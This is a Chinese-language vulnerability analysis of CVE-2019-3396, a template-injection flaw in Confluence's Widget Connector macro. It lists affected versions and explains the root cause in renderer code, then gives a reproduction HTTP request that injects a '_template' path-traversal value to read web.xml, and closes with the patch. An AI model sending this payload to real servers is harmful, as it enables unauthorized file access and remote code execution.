Widget Connector 宏漏洞 - CVE-2019-3396


严重性


Atlassian公司将此漏洞的严重性评级为危急critical。根据公开的  Atlassian公司安全问题严重程度评级标准 量表。该量表允许我们将严重程度排列为危急、高、中或低。


这只是我们的评估，您可以根据自己公司的IT环境的适用性对其进行严重程度评级。


描述


在 Widget Connector插件中，Confluence 服务器和Confluence数据中心中存在服务器端模板注入漏洞。攻击者能够利用此问题在运行易受攻击的Confluence 服务器或数据中心版本的系统上实现服务器端模板注入、路径遍历和远程代码执行。


受影响的产品


Confluence 服务器

Confluence 数据中心

受影响的版本


版本6.6.12之前的所有版本的Confluence 服务器和 Confluence数据中心；


6.12.3之前的版本6.7.0（6.12.x的固定版本）；


6.13.3之前的版本6.13.0（6.13的固定版本）；


6.14.2之前的版本6.14.0（6.14.x的固定版本）。

Widget Connector 宏已经定义了一些渲染。例如 FriendFeedRenderer 类( 注：FriendFeed是一个聚合个人信息的网站，这个类是定义了对FriendFeed网站小部件的渲染)：

public class FriendFeedRenderer implements WidgetRenderer

{

...

public String getEmbeddedHtml(String url, Map<String, String> params) {

params.put("_template", "com/atlassian/confluence/extra/widgetconnector/templates/simplejscript.vm");

return this.velocityRenderService.render(getEmbedUrl(url), params);

}

}

在 FriendFeedRenderer 的 getEmbeddedHtml 方法，你会看到该方法把另一个选项 _template放到了 params 的 map 集合中。




但是，其他一些渲染器，例如video类，只是通过render(getEmbedUrl(url), params)方法直接调用。

所以在这种情况下，我们可以“自己提供”_template选项，后端会使用这个参数进行渲染。

复现:

POST /rest/tinymce/1/macro/preview HTTP/1.1

{"contentId":"65601","macro":{"name":"widget","params":{"url":"https://www.viddler.com/v/test","width":"1000","height":"1000","_template":"../web.xml"},"body":""}}

补丁:

修复版本中，在渲染 html 之前调用doSanitizeParameters 方法，这会在参数中移除_template 。


代码可能是这样的：

public class WidgetMacro

extends BaseMacro

this.sanitizeFields = Collections.unmodifiableList(Arrays.asList(new String[] { "_template" }));

public String execute(Map<String, String> parameters, String body, ConversionContext conversionContext) {

...

doSanitizeParameters(parameters);

return this.renderManager.getEmbeddedHtml(url, parameters);

}

private void doSanitizeParameters(Map<String, String> parameters)

{

Objects.requireNonNull(parameters);

for (String sanitizedParameter : this.sanitizeFields) {

parameters.remove(sanitizedParameter);

}

}
